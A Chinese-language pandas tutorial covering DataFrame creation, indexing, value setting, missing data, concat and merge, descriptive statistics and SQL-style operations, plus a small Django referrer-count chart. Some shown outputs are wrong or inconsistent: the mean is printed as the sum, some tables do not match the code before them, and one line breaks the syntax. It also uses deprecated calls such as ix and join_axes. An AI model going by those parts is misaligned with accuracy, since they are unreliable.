< class 'pandas.core.frame.DataFrame'>
   0   1   2
0  0   1   2
1  3   4   5
2  6   7   8
3  9  10  11
'''

# 通过字典列表的方式创建数据框
>>> data = {'name': ['BTC', 'ETH', 'EOS'], 'price':[50000, 4000, 150]}
>>> df = DataFrame(data)
>>> df
  name  price
0  BTC  50000
1  ETH   4000
2  EOS    150

# 通过嵌套字典的方式创建数据框
dict3={'one':{'a':1,'b':2,'c':3,'d':4},'two':{'a':5,'b':6,'c':7,'d':8},'three':{'a':9,'b':10,'c':11,'d':12}}
print(dict3)
df3=pd.DataFrame(dict3)
print(df3)
'''
   one  two  three
a    1    5      9
b    2    6     10
c    3    7     11
d    4    8     12
'''

# 查看DataFrame的相关信息
>>> df.index
RangeIndex(start=0, stop=3, step=1)
>>> df.values
array([['BTC', 50000],
       ['ETH', 4000],
       ['EOS', 150]], dtype=object)
>>> df.columns    # DataFrame的列标签,返回所有列的名称
Index(['name', 'price'], dtype='object')

# 查看数据某一列信息的几个函数：
df['Contour'].value_counts() : 返回计算列中每个值出现次数。
df['Contour'].isnull().sum()：返回'Contour'列中的空值计数
df['pH'].notnull().sum()：返回“pH”列中非空值的计数
df['Depth'].unique()：返回'Depth'列中的唯一值

# DataFrame的索引,行索引iloc、loc
>>> df.name
0    BTC
1    ETH
2    EOS
Name: name, dtype: object
>>> df['name']
0    BTC
1    ETH
2    EOS
Name: name, dtype: object
>>> df.iloc[1]  # loc['name']查询的是行标签
name      ETH
price    4000
Name: 1, dtype: object

# 增加列
>>> df['type'] = 'token'
>>> df
  name  price   type
0  BTC  50000  token
1  ETH   4000  token
2  EOS    150  token

# 增加行
>>> df.loc['3'] = ['ae', 200, 'token']
>>> df
  name  price   type
0  BTC  50000  token
1  ETH   4000  token
2  EOS    150  token
3   ae    200  token

# 删除列
>>> del df['type']
>>> df
  name  price
0  BTC  50000
1  ETH   4000
2  EOS    150
3   ae    200

# 删除行
>>> df.drop([2])
  name  price
0  BTC  50000
1  ETH   4000
3   ae    200
>>> df
  name  price
0  BTC  50000
1  ETH   4000
2  EOS    150
3   ae    200

# 使用drop()方法返回的是Copy而不是视图,要想真正在原数据里删除行,就要设置inplace=True
>>> df.drop([2], inplace=True)
>>> df
  name  price
0  BTC  50000
1  ETH   4000
3   ae    200

# 设置某一列为index
>>> df.set_index(['name'], inplace=True)
>>> df
      price
name
BTC   50000
ETH    4000
ae      200

# 将index返回回dataframe中
>>> df.reset_index(inplace=True)
>>> df
  name  price
0  BTC  50000
1  ETH   4000
2   ae    200

</textarea><textarea>
import numpy as np
import pandas as pd
dates=pd.date_range('20180310',periods=6)
df = pd.DataFrame(np.random.randn(6,4), index=dates, columns=['A','B','C','D'])  #生成6行4列位置
print(type(df), df) # 输出6行4列的表格
'''
< class 'pandas.core.frame.DataFrame'>
                   A         B         C         D
2018-03-10 -0.092889 -0.503172  0.692763 -1.261313
2018-03-11 -0.895628 -2.300249 -1.098069  0.468986
2018-03-12  0.084732 -1.275078  1.638007 -0.291145
2018-03-13 -0.561528  0.431088  0.430414  1.065939
2018-03-14  1.485434 -0.341404  0.267613 -1.493366
2018-03-15 -1.671474  0.110933  1.688264 -0.910599
'''
# 创建特定数据的DataFrame
df_1=pd.DataFrame({
    'A' : 1.,
    'B' : pd.Timestamp('20180310'),
    'C' : pd.Series(1,index=list(range(4)),dtype='float32'),
    'D' : np.array([3] * 4,dtype='int32'),
    'E' : pd.Categorical(["test","train","test","train"]),
    'F' : 'foo'
})
print(df_1)
'''
     A          B    C  D      E    F
0  1.0 2018-03-10  1.0  3   test  foo
1  1.0 2018-03-10  1.0  3  train  foo
2  1.0 2018-03-10  1.0  3   test  foo
3  1.0 2018-03-10  1.0  3  train  foo
'''
print(df_1.dtypes)
'''
A           float64
B    datetime64[ns]
C           float32
D             int32
E          category
F            object
dtype: object
'''
print(df_1.index)   # 行的序号,Int64Index([0, 1, 2, 3], dtype='int64')
print(df_1.columns) # 列的序号名字,Index(['A', 'B', 'C', 'D', 'E', 'F'], dtype='object')
print(df_1.values)  # 把每个值进行打印出来
'''
[[1.0 Timestamp('2018-03-10 00:00:00') 1.0 3 'test' 'foo']
 [1.0 Timestamp('2018-03-10 00:00:00') 1.0 3 'train' 'foo']
 [1.0 Timestamp('2018-03-10 00:00:00') 1.0 3 'test' 'foo']
 [1.0 Timestamp('2018-03-10 00:00:00') 1.0 3 'train' 'foo']]
 '''
print(df_1.describe()) #数字总结,提供描述性统计数据。
'''
         A    C    D
count  4.0  4.0  4.0
mean   1.0  1.0  3.0
std    0.0  0.0  0.0
min    1.0  1.0  3.0
25%    1.0  1.0  3.0
50%    1.0  1.0  3.0
75%    1.0  1.0  3.0
max    1.0  1.0  3.0
'''
>>> print(df_1.head())
>>> print(df_1.tail())
>>> print(df_1.shape)   # (4, 6)
>>> print(df_1.info())  # 提供数据摘要,包括索引数据类型,列数据类型,非空值和内存使用情况
< class 'pandas.core.frame.DataFrame'>
Int64Index: 4 entries, 0 to 3
Data columns (total 6 columns):
A    4 non-null float64
B    4 non-null datetime64[ns]
C    4 non-null float32
D    4 non-null int32
E    4 non-null category
F    4 non-null object
dtypes: category(1), datetime64[ns](1), float32(1), float64(1), int32(1), object(1)
memory usage: 260.0+ bytes
None

print(df_1.T) #翻转数据
'''
                     0                    1                    2  \
A                    1                    1                    1
B  2018-03-10 00:00:00  2018-03-10 00:00:00  2018-03-10 00:00:00
C                    1                    1                    1
D                    3                    3                    3
E                 test                train                 test
F                  foo                  foo                  foo

                     3
A                    1
B  2018-03-10 00:00:00
C                    1
D                    3
E                train
F                  foo
'''
print(df_1.sort_index(axis=1, ascending=False)) # axis等于1按列进行排序,如ABCDEFG,然后ascending倒叙进行显示
'''
     F      E  D    C          B    A
0  foo   test  3  1.0 2018-03-10  1.0
1  foo  train  3  1.0 2018-03-10  1.0
2  foo   test  3  1.0 2018-03-10  1.0
3  foo  train  3  1.0 2018-03-10  1.0
'''
print(df_1.sort_values(by='E')) # 按值进行排序
'''
     A          B    C  D      E    F
0  1.0 2018-03-10  1.0  3   test  foo
2  1.0 2018-03-10  1.0  3   test  foo
1  1.0 2018-03-10  1.0  3  train  foo
3  1.0 2018-03-10  1.0  3  train  foo
'''

</textarea>【 Pandas选择数据 】<textarea>
dates=pd.date_range('20180310',periods=6)
df = pd.DataFrame(np.random.randn(6,4), index=dates, columns=['A','B','C','D'])#生成6行4列位置
print(df)
'''
                   A         B         C         D
2018-03-10 -0.520509 -0.136602 -0.516984  1.357505
2018-03-11  0.332656 -0.094633  0.382384 -0.914339
2018-03-12  0.499960  1.576897  2.128730  2.197465
2018-03-13  0.540385  0.427337 -0.591381  0.126503
2018-03-14  0.191962  1.237843  1.903370  2.155366
2018-03-15 -0.188331 -0.578581 -0.845854 -0.056373
 '''
print(df['A'])             # 选择某列
print(type(df.A), df.A)    # 同上
'''
< class 'pandas.core.series.Series'>
2018-03-10   -0.520509
2018-03-11    0.332656
2018-03-12    0.499960
2018-03-13    0.540385
2018-03-14    0.191962
2018-03-15   -0.188331
'''
# 切片选择
print(df[0:3], df['20180310':'20180314']) #两次进行选择 第一次切片选择 第二次按照筛选条件进行选择
'''
                   A         B         C         D
2018-03-10 -0.520509 -0.136602 -0.516984  1.357505
2018-03-11  0.332656 -0.094633  0.382384 -0.914339
2018-03-12  0.499960  1.576897  2.128730  2.197465
                  A         B         C         D
2018-03-10 -0.520509 -0.136602 -0.516984  1.357505
2018-03-11  0.332656 -0.094633  0.382384 -0.914339
2018-03-12  0.499960  1.576897  2.128730  2.197465
2018-03-13  0.540385  0.427337 -0.591381  0.126503
2018-03-14  0.191962  1.237843  1.903370  2.155366
'''

# 根据标签loc-行标签进行选择数据
print(df.loc['20180312', ['A','B']]) #按照行标签进行选择 精确选择
'''
A    0.499960
B    1.576897
Name: 2018-03-12 00:00:00, dtype: float64
'''

# 根据序列iloc-行号进行选择数据,如输出第三行第一列的数据
print(df.iloc[3, 1])
# 0.427336827399

print(df.iloc[3:5,0:2]) #进行切片选择
'''
                   A         B
2018-03-13  0.540385  0.427337
2018-03-14  0.191962  1.237843
 '''

print(df.iloc[[1,2,4],[0,2]]) #进行不连续筛选
'''
                   A         C
2018-03-11  0.332656  0.382384
2018-03-12  0.499960  2.128730
2018-03-14  0.191962  1.903370
 '''

# 根据混合的两种ix
print(df.ix[:3, ['A', 'C']])
'''
                   A         C
2018-03-10 -0.919275 -1.356037
2018-03-11  0.010171 -0.380010
2018-03-12  0.285251 -1.174265
 '''

# 根据判断筛选
print(df[df.A > 0]) #筛选出df.A大于0的元素 布尔条件筛选
'''
                   A         B         C         D
2018-03-11  0.332656 -0.094633  0.382384 -0.914339
2018-03-12  0.499960  1.576897  2.128730  2.197465
2018-03-13  0.540385  0.427337 -0.591381  0.126503
2018-03-14  0.191962  1.237843  1.903370  2.155366
 '''

</textarea>【 Pandas设置数据 】<textarea>
# 根据loc和iloc设置
dates = pd.date_range('20180310', periods=6)
df = pd.DataFrame(np.arange(24).reshape((6,4)), index=dates, columns=['A', 'B', 'C', 'D'])
print(df)
'''
             A   B     C   D
2018-03-10   0   1     2   3
2018-03-11   4   5     6   7
2018-03-12   8   9  1111  11
2018-03-13  12  13    14  15
2018-03-14  16  17    18  19
2018-03-15  20  21    22  23
'''

# 单点设置
df.iloc[2,2] = 999
df.loc['2018-03-13', 'D'] = 999
print(df)
'''
            A   B    C    D
2018-03-10  0   1    2    3
2018-03-11  0   5    6    7
2018-03-12  0   9  999   11
2018-03-13  0  13   14  999
2018-03-14  0  17   18   19
2018-03-15  0  21   22   23
'''

# 根据条件设置
df[df.A>0]=999 # 将df.A大于0的值改变
print(df)
'''
              A   B    C    D
2018-03-10    0   1    2    3
2018-03-11  999   5    6    7
2018-03-12  999   9  999   11
2018-03-13  999  13   14  999
2018-03-14  999  17   18   19
2018-03-15  999  21   22   23
'''

# 根据行或列设置
df['F']=np.nan
print(df)
'''
              A   B    C   D
2018-03-10    0   1    2 NaN
2018-03-11  999   5    6 NaN
2018-03-12  999   9  999 NaN
2018-03-13  999  13   14 NaN
2018-03-14  999  17   18 NaN
2018-03-15  999  21   22 NaN
 '''

# 添加数据
df['E']  = pd.Series([1,2,3,4,5,6], index=pd.date_range('20180313', periods=6)) #增加一列
print(df)
'''
              A   B    C   D    E
2018-03-10    0   1    2 NaN  NaN
2018-03-11  999   5    6 NaN  NaN
2018-03-12  999   9  999 NaN  NaN
2018-03-13  999  13   14 NaN  1.0
2018-03-14  999  17   18 NaN  2.0
2018-03-15  999  21   22 NaN  3.0
'''

</textarea>【 Pandas处理丢失数据、处理缺失值 】<textarea>
# 处理数据中NaN数据
dates = pd.date_range('20180310', periods=6)
df = pd.DataFrame(np.arange(24).reshape((6,4)), index=dates, columns=['A', 'B', 'C', 'D'])
df.iloc[0,1]=np.nan
df.iloc[1,2]=np.nan
print(df)
'''
             A     B     C   D
2018-03-10   0   NaN   2.0   3
2018-03-11   4   5.0   NaN   7
2018-03-12   8   9.0  10.0  11
2018-03-13  12  13.0  14.0  15
2018-03-14  16  17.0  18.0  19
2018-03-15  20  21.0  22.0  23
'''

# 使用dropna()函数去掉NaN的行或列,这些方法返回的是copy而不是视图,如果想在原数据上改变别忘了inplace=True
print(df.dropna())  # 丢弃含有缺失值的行
             A     B     C   D
2018-03-12   8   9.0  10.0  11
2018-03-13  12  13.0  14.0  15
2018-03-14  16  17.0  18.0  19
2018-03-15  20  21.0  22.0  23

print(df.dropna(axis=0,how='any'#)) #0对行进行操作 1对列进行操作 any:只要存在NaN即可drop掉 all:必须全部是NaN才可drop
'''
             A     B     C   D
2018-03-12   8   9.0  10.0  11
2018-03-13  12  13.0  14.0  15
2018-03-14  16  17.0  18.0  19
2018-03-15  20  21.0  22.0  23
 '''
# 使用fillna()函数替换NaN值
print(df.fillna(0))
print(df.fillna(value=0)) # 将NaN值替换为0,填充缺失值数据为0
'''
             A     B     C   D
2018-03-10   0   0.0   2.0   3
2018-03-11   4   5.0   0.0   7
2018-03-12   8   9.0  10.0  11
2018-03-13  12  13.0  14.0  15
2018-03-14  16  17.0  18.0  19
2018-03-15  20  21.0  22.0  23
 '''

# 使用isnull()函数判断数据是否丢失
print(pd.isnull(df))#矩阵用布尔来进行表示 是nan为ture 不是nan为false
'''
                A      B      C      D
2018-03-10  False   True  False  False
2018-03-11  False  False   True  False
2018-03-12  False  False  False  False
2018-03-13  False  False  False  False
2018-03-14  False  False  False  False
2018-03-15  False  False  False  False
 '''
print(np.any(df.isnull()))#判断数据中是否会存在NaN值
#True

</textarea>【 Pandas合并数据 】<textarea>
# axis合并方向
df1 = pd.DataFrame(np.ones((3,4))*0, columns=['a','b','c','d'])
df2 = pd.DataFrame(np.ones((3,4))*1, columns=['a','b','c','d'])
df3 = pd.DataFrame(np.ones((3,4))*2, columns=['a','b','c','d'])
res = pd.concat([df1, df2, df3], axis=0, ignore_index=True)#0表示竖项合并 1表示横项合并 ingnore_index重置序列index index变为0 1 2 3 4 5 6 7 8
print(res)
'''
     a    b    c    d
0  0.0  0.0  0.0  0.0
1  0.0  0.0  0.0  0.0
2  0.0  0.0  0.0  0.0
3  1.0  1.0  1.0  1.0
4  1.0  1.0  1.0  1.0
5  1.0  1.0  1.0  1.0
6  2.0  2.0  2.0  2.0
7  2.0  2.0  2.0  2.0
8  2.0  2.0  2.0  2.0
 '''

# join合并方式
df1 = pd.DataFrame(np.ones((3,4))*0, columns=['a','b','c','d'], index=[1,2,3])
df2 = pd.DataFrame(np.ones((3,4))*1, columns=['b','c','d', 'e'], index=[2,3,4])
print(df1)
'''
     a    b    c    d
1  0.0  0.0  0.0  0.0
2  0.0  0.0  0.0  0.0
3  0.0  0.0  0.0  0.0
 '''
print(df2)
'''
     b    c    d    e
2  1.0  1.0  1.0  1.0
3  1.0  1.0  1.0  1.0
4  1.0  1.0  1.0  1.0
 '''
res=pd.concat([df1,df2],axis=1,join='outer')#行往外进行合并
print(res)
'''
     a    b    c    d    b    c    d    e
1  0.0  0.0  0.0  0.0  NaN  NaN  NaN  NaN
2  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0
3  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0
4  NaN  NaN  NaN  NaN  1.0  1.0  1.0  1.0
 '''

res=pd.concat([df1,df2],axis=1,join='outer')#行相同的进行合并
print(res)
'''
     a    b    c    d    b    c    d    e
2  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0
3  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0
'''

res=pd.concat([df1,df2],axis=1,join_axes=[df1.index])#以df1的序列进行合并 df2中没有的序列NaN值填充
print(res)
'''
     a    b    c    d    b    c    d    e
1  0.0  0.0  0.0  0.0  NaN  NaN  NaN  NaN
2  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0
3  0.0  0.0  0.0  0.0  1.0  1.0  1.0  1.0
'''

# append添加数据
df1 = pd.DataFrame(np.ones((3,4))*0, columns=['a','b','c','d'])
df2 = pd.DataFrame(np.ones((3,4))*1, columns=['a','b','c','d'])
df3 = pd.DataFrame(np.ones((3,4))*1, columns=['a','b','c','d'])
s1 = pd.Series([1,2,3,4], index=['a','b','c','d'])
res=df1.append(df2,ignore_index=True)#将df2合并到df1的下面 并重置index
print(res)
'''
     a    b    c    d
0  0.0  0.0  0.0  0.0
1  0.0  0.0  0.0  0.0
2  0.0  0.0  0.0  0.0
3  1.0  1.0  1.0  1.0
4  1.0  1.0  1.0  1.0
5  1.0  1.0  1.0  1.0
'''

res=df1.append(s1,ignore_index=True)#将s1合并到df1下面 并重置index
print(res)
'''
     a    b    c    d
0  0.0  0.0  0.0  0.0
1  0.0  0.0  0.0  0.0
2  0.0  0.0  0.0  0.0
3  1.0  2.0  3.0  4.0
'''

</textarea>【 Pandas合并merge,进行数据合并操作会出现重复值的情况,DataFrame提供了简便的方法data.drop_duplicates(inplace=True) 】<textarea>
# 依据一组key合并
left = pd.DataFrame({'key': ['K0', 'K1', 'K2', 'K3'], 'A': ['A0', 'A1', 'A2', 'A3'], 'B': ['B0', 'B1', 'B2', 'B3']})
print(left)
'''
    A   B key
0  A0  B0  K0
1  A1  B1  K1
2  A2  B2  K2
3  A3  B3  K3
'''
right = pd.DataFrame({'key': ['K0', 'K1', 'K2', 'K3'], 'C': ['C0', 'C1', 'C2',  'C3'], 'D': ['D0', 'D1', 'D2', 'D3']})
print(right)
'''
    C   D key
0  C0  D0  K0
1  C1  D1  K1
2  C2  D2  K2
3  C3  D3  K3
'''
res=pd.merge(left,right,on='key')
print(res)
'''
    A   B key   C   D
0  A0  B0  K0  C0  D0
1  A1  B1  K1  C1  D1
2  A2  B2  K2  C2  D2
3  A3  B3  K3  C3  D3
'''

# 依据两组key合并
left = pd.DataFrame({'key1': ['K0', 'K0', 'K1', 'K2'],'key2': ['K0', 'K1', 'K0', 'K1'],'A': ['A0', 'A1', 'A2', 'A3'],'B': ['B0', 'B1', 'B2', 'B3']})
print(left)
'''
    A   B key1 key2
0  A0  B0   K0   K0
1  A1  B1   K0   K1
2  A2  B2   K1   K0
3  A3  B3   K2   K1
 '''
right = pd.DataFrame({'key1': ['K0', 'K1', 'K1', 'K2'], 'key2': ['K0', 'K0', 'K0', 'K0'], 'C': ['C0', 'C1', 'C2', 'C3'], 'D': ['D0', 'D1', 'D2', 'D3']})
print(right)
'''
    C   D key1 key2
0  C0  D0   K0   K0
1  C1  D1   K1   K0
2  C2  D2   K1   K0
3  C3  D3   K2   K0
 '''

res=pd.merge(left,right,on=['key1','key2'],how='inner')#内联合并
print(res)
'''
    A   B key1 key2   C   D
0  A0  B0   K0   K0  C0  D0
1  A2  B2   K1   K0  C1  D1
2  A2  B2   K1   K0  C2  D2
'''

res=pd.merge(left,right,on=['key1','key2'],how='outer')#外联合并
print(res)
'''
     A    B key1 key2    C    D
0   A0   B0   K0   K0   C0   D0
1   A1   B1   K0   K1  NaN  NaN
2   A2   B2   K1   K0   C1   D1
3   A2   B2   K1   K0   C2   D2
4   A3   B3   K2   K1  NaN  NaN
5  NaN  NaN   K2   K0   C3   D3
'''

res=pd.merge(left,right,on=['key1','key2'],how='left')#左联合并
'''
    A   B key1 key2    C    D
0  A0  B0   K0   K0   C0   D0
1  A1  B1   K0   K1  NaN  NaN
2  A2  B2   K1   K0   C1   D1
3  A2  B2   K1   K0   C2   D2
4  A3  B3   K2   K1  NaN  NaN
'''

res=pd.merge(left,right,on=['key1','key2'],how='right')#右联合并
print(res)
'''
     A    B key1 key2   C   D
0   A0   B0   K0   K0  C0  D0
1   A2   B2   K1   K0  C1  D1
2   A2   B2   K1   K0  C2  D2
3  NaN  NaN   K2   K0  C3  D3
'''

# Indicator合并
df1 = pd.DataFrame({'col1':[0,1], 'col_left':['a','b']})
print(df1)
'''
   col1 col_left
0     0        a
1     1        b
 '''
df2 = pd.DataFrame({'col1':[1,2,2],'col_right':[2,2,2]})
print(df2)
'''
   col1  col_right
0     1          2
1     2          2
2     2          2
 '''

res=pd.merge(df1,df2,on='col1',how='outer',indicator=True)#依据col1进行合并 并启用indicator=True输出每项合并方式
print(res)
'''
   col1 col_left  col_right      _merge
0     0        a        NaN   left_only
1     1        b        2.0        both
2     2      NaN        2.0  right_only
3     2      NaN        2.0  right_only
'''

res = pd.merge(df1, df2, on='col1', how='outer', indicator='indicator_column')#自定义indicator column名称
print(res)
'''
   col1 col_left  col_right indicator_column
0     0        a        NaN        left_only
1     1        b        2.0             both
2     2      NaN        2.0       right_only
3     2      NaN        2.0       right_only
'''

# 依据index合并
left = pd.DataFrame({'A': ['A0', 'A1', 'A2'], 'B': ['B0', 'B1', 'B2']}, index=['K0', 'K1', 'K2'])
print(left)
'''
     A   B
K0  A0  B0
K1  A1  B1
K2  A2  B2
 '''
right = pd.DataFrame({'C': ['C0', 'C2', 'C3'], 'D': ['D0', 'D2', 'D3']}, index=['K0', 'K2', 'K3'])
print(right)
'''
     C   D
K0  C0  D0
K2  C2  D2
K3  C3  D3
'''

res=pd.merge(left,right,left_index=True,right_index=True,how='outer')#根据index索引进行合并 并选择外联合并
print(res)
'''
      A    B    C    D
K0   A0   B0   C0   D0
K1   A1   B1  NaN  NaN
K2   A2   B2   C2   D2
K3  NaN  NaN   C3   D3
'''

res=pd.merge(left,right,left_index=True,right_index=True,how='inner')
print(res)
'''
     A   B   C   D
K0  A0  B0  C0  D0
K2  A2  B2  C2  D2
'''

</textarea>django+pandas+matplotlib进行日志分析,画图,页面展示,统计站点有多少数量是直接输入域名访问,多少是从其他地方referred过来<textarea>
# mysite/views.py
def test(request):
    d={
        '1.htldxhzj.duapp.com': 9398,
        'gtxapi.cdn.duapp.com': 79496,
        'www.xxx.com': 2477070,
        'www.baidu.com': 1465,
        'www.bing.com': 777,
        'www.aaa.com': 1113101,
        'www.ccc.net.cn': 922,
        'www.zhanimei.ga': 29847,
        'www.zhanimei.ml': 40155,
        'www.zhasini.ml': 373436
    }

    from pandas import Series,DataFrame
    import matplotlib.pyplot as plt

    plt.figure(figsize=(8,6), dpi=80)
    ts = Series(d)
    ts.plot(kind='barh')
    plt.savefig('./log.png') # 图片保存在项目根目录

</textarea><pre>
【 对DataFrames进行统计分析 】
Pandas提供了很多描述性统计分析的指标函数,包括总和,均值,最小值,最大值等。

</pre><textarea>
a=np.random.normal(size=10)
d1=pd.Series(2*a+3)
d2=np.random.f(2,4,size=10)
d3=np.random.randint(1,100,size=10)
d1
0    1.361823
1    3.383916
2    5.883503
3    3.340880
4   -0.209247
5   -0.903334
6    4.200482
7    5.898955
8    0.497768
9    3.828233
dtype: float64
d2
array([2.73845185, 3.59022296, 0.55467725, 0.28750188, 0.34960996,
       0.7446843 , 0.5441969 , 0.08108917, 0.87382443, 1.95080134])
d3
array([58, 85, 37, 22, 44, 87, 44, 81, 15, 12])

非空元素的计算
d1.count()
10

最小值
d1.min()
-0.9033339369138083

最大值
d1.max()
5.898954520064915

最小值的位置
d1.idxmin()
5

最大值的位置
d1.idxmax()
7

10%分位数
d1.quantile(0.1)
-0.2786556043409657

求和
d1.sum()
27.282978601831385

平均数
d1.mean()
27.282978601831385

中位数
d1.median()
3.3623977769830757

众数
d1.mode()
0   -0.903334
1   -0.209247
2    0.497768
3    1.361823
4    3.340880
5    3.383916
6    3.828233
7    4.200482
8    5.883503
9    5.898955
dtype: float64

方差
d1.var()
5.872343682843825

标准差
d1.std()
2.423291910365696

平均绝对偏差
d1.mad()
2.0332362412191087

偏度
d1.skew()
-0.18129460109486695

峰度
d1.kurt()
-1.2804216694366866

一次性输出多个描述性统计指标
d1.describe()
count    10.000000
mean      2.728298
std       2.423292
min      -0.903334
25%       0.713782
50%       3.362398
75%       4.107420
max       5.898955
dtype: float64

#自定义一个函数,将这些统计描述指标全部汇总到一起
def stats(x):
    return pd.Series([x.count(),x.min(),x.idxmin(),x.quantile(.25),x.median(), x.quantile(.75),x.mean(),x.max(),x.idxmax(),x.mad(),x.var(),x.std(),x.skew(),x.kurt()], index=['Count','Min','Which_Min','Q1','Median','Q3','Mean','Max','Which_Max','Mad','Var','Std','Skew', 'Kurt'])
stats(d1)
Count        10.000000
Min          -0.903334
Which_Min     5.000000
Q1            0.713782
Median        3.362398
Q3            4.107420
Mean          2.728298
Max           5.898955
Which_Max     7.000000
Mad           2.033236
Var           5.872344
Std           2.423292
Skew         -0.181295
Kurt         -1.280422
dtype: float64

# 对于数字型数据,它是直接统计一些数据性描述,观察这一系列数据的范围。大小、波动趋势,便于判断后续对数据采取哪类模型更合适。
# 当实际工作中需要处理的是一系列的数值型数据框,可以使用apply函数将这个stats函数应用到数据框中的每一列
df=pd.DataFrame(np.array([d1,d2,d3]).T, columns=['x1','x2','x3']) #将之前创建的d1,d2,d3数据构建数据框
print(df.head())
'''
         x1        x2    x3
0  1.361823  2.738452  58.0
1  3.383916  3.590223  85.0
2  5.883503  0.554677  37.0
3  3.340880  0.287502  22.0
4 -0.209247  0.349610  44.0
'''
df.apply(stats)
'''
                  x1         x2          x3
Count      10.000000  10.000000   10.000000
Min        -0.903334   0.081089   12.000000
Which_Min   5.000000   7.000000    9.000000
Q1          0.713782   0.398257   25.750000
Median      3.362398   0.649681   44.000000
Q3          4.107420   1.681557   75.250000
Mean        2.728298   1.171506   48.500000
Max         5.898955   3.590223   87.000000
Which_Max   7.000000   1.000000    5.000000
Mad         2.033236   0.952992   23.400000
Var         5.872344   1.400398  810.055556
Std         2.423292   1.183384   28.461475
Skew       -0.181295   1.285827    0.206893
Kurt       -1.280422   0.495581   -1.465033
'''

# 以上很简单的创建了数值型数据的统计性描述,但对于离散型数据就不能使用该方法了。在统计离散变量的观测数、唯一值个数、众数水平及个数,只需要使用describe方法就可以实现这样的统计了。

dict={
    'one':{'a':1,'b':2,'c':3,'d':4,'e':5,'f':6,'g':7},
    'two':{'a':8,'b':9,'c':10,'d':11,'e':12,'f':13,'g':14},
    'three':{'a':15,'b':16,'c':17,'d':18,'e':19,'f':20,'g':21},
    'four':{'a':'manager','b':'admin','c':'enginer','d':'doctor','e':'worker','f':'editer','g':'unkown'},
}
df=pd.DataFrame(dict)
df.head(3)
'''
   one  two  three     four
a    1    8     15  manager
b    2    9     16    admin
c    3   10     17  enginer
'''
df['one'].describe()  # 数值型数据的描述
'''
count    7.000000
mean     4.000000
std      2.160247
min      1.000000
25%      2.500000
50%      4.000000
75%      5.500000
max      7.000000
Name: one, dtype: float64
'''
df['four'].describe()  # 离散型数据的描述
'''
count         7
unique        7
top       admin
freq          1
Name: four, dtype: object
'''

# 除了以上简单的描述性统计之外,还提供了连续变量的相关系数(corr)和协方差(cov)的求解

</textarea>pandas实现SQL操作<textarea>
>>> dict={
>>>     'Name':['LiuShunxiang','Zhangshan'],
>>>     'Sex':['M','F'],
>>>     'Age':[27,23],
>>>     'Height':[165.7,167.2],
>>>     'weight':[61,63]
>>> }
>>> student1=pd.DataFrame(dict)
>>> student1
           Name Sex  Age  Height  weight
0  LiuShunxiang   M   27   165.7      61
1     Zhangshan   F   23   167.2      63

>>> dict={
>>>     'Name':['Liu','Zhang'],
>>>     'Sex':['M','F'],
>>>     'Age':[27,23],
>>>     'Height':[165.7,167.2],
>>>     'weight':[61,63]
>>> }
>>> student2=pd.DataFrame(dict)
>>> student2
    Name Sex  Age  Height  weight
0    Liu   M   27   165.7      61
1  Zhang   F   23   167.2      63

# 将student2中的数据新增到student1中,可以通过concat函数实现,concat函数对index无视
>>> student3=pd.concat([student1,student2],ignore_index='Ture')
>>> student3
           Name Sex  Age  Height  weight
0  LiuShunxiang   M   27   165.7      61
1     Zhangshan   F   23   167.2      63
2           Liu   M   27   165.7      61
3         Zhang   F   23   167.2      63

# 添加新列---增加的新列没有赋值,就会出现NAN的形式
>>> pd.DataFrame(student2,columns=['Age','Heught','Name','Sex','weight','Score'])
   Age  Heught   Name Sex  weight  Score
0   27     NaN    Liu   M      61    NaN
1   23     NaN  Zhang   F      63    NaN
# 删：删除表、观测行或变量列
# 删除整个数据框
>>> del student2

# 不论删除行还是列,都可以通过drop方法实现,只需要设定好删除的轴即可,即调整drop方法中的axis参数。默认参数为0,即删除行观测数据,如果需要删除列变量,则需要设置为1
# 删除指定行
>>> student3.drop([0])
        Name Sex  Age  Height  weight
1  Zhangshan   F   23   167.2      63
2        Liu   M   27   165.7      61
3      Zhang   F   23   167.2      63
# 删除25岁以上的学生
>>> student3[student3['Age']<25]
        Name Sex  Age  Height  weight
1  Zhangshan   F   23   167.2      63
3      Zhang   F   23   167.2      63
# 删除指定的列
>>> student3.drop(['Height','weight'],axis=1)
           Name Sex  Age
0  LiuShunxiang   M   27
1     Zhangshan   F   23
2           Liu   M   27
3         Zhang   F   23

# 改：修改原始记录的值,结合布尔索引和赋值的方法
>>> student3
           Name Sex  Age  Height  weight
0  LiuShunxiang   M   27   165.7      61
1     Zhangshan   F   23   167.2      63
2           Liu   M   27   165.7      61
3         Zhang   F   23   167.2      63
>>> student3.loc[student3['Name']=='Liu','Height']=173
>>> student3
           Name Sex  Age  Height  weight
0  LiuShunxiang   M   27   165.7      61
1     Zhangshan   F   23   167.2      63
2           Liu   M   27   173.0      61
3         Zhang   F   23   167.2      63

# 聚合查询：groupby()
>>> student3.groupby('Sex').mean()
     Age  Height  weight
Sex
F     23  167.20      63
M     27  169.35      61

# 多个分组变量,例如根据年龄和性别分组,计算身高和体重的平均值
>>> student3.groupby(['Sex','Age']).mean()
         Height  weight
Sex Age
F   23   167.20      63
M   27   169.35      61

# 对每个分组计算多个统计量
>>> student3.drop('Age',axis=1).groupby('Sex').agg([np.mean,np.median])
     Height         weight
       mean  median   mean median
Sex
F    167.20  167.20     63     63
M    169.35  169.35     61     61

# 排序：sort_values
>>> series=pd.Series(np.array(np.random.randint(1,20,10)))
>>> series
0     1
1    11
2     4
3    15
4     2
5     4
6    11
7     9
8    16
9    13
dtype: int32
# 默认按值升序排列
>>> series.sort_values()
0     1
4     2
2     4
5     4
7     9
1    11
6    11
9    13
3    15
8    16
dtype: int32
# 按降序排列
>>> series.sort_values(ascending=False)
8    16
3    15
9    13
6    11
1    11
7     9
5     4
2     4
4     2
0     1
dtype: int32

# 数据框中按值排列
>>> student3.sort_values(by=['Sex','Age'])
           Name Sex  Age  Height  weight
1     Zhangshan   F   23   167.2      63
3         Zhang   F   23   167.2      63
0  LiuShunxiang   M   27   165.7      61
2           Liu   M   27   173.0      61

# 多表链接-merge
>>> dict2={'Name':['Alfred','Alice','Barbara','Carol','Henry','Jeffrey','Judy','Philip','Robert','william'],
...  'Score':[88,76,89,67,79,90,92,86,73,77]}
>>> score=pd.DataFrame(dict2)
>>> score
      Name  Score
0   Alfred     88
1    Alice     76
2  Barbara     89
3    Carol     67
4    Henry     79
5  Jeffrey     90
6     Judy     92
